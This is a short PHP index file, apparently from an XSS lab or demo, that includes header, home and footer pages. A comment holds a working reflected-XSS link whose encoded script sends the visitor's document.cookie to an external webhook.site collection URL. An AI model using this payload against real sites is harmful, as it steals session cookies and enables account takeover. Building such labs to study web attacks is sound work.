
<?php
    //including the pages
    include 'header.php';
    include 'home.php';
    include "footer.php";
    //use this link for xss attack
    //http://localhost:3000/index.php?page=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22https://webhook.site/17db3732-2a8d-4fd5-af57-6e6afaea8afa?c=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E
?> 
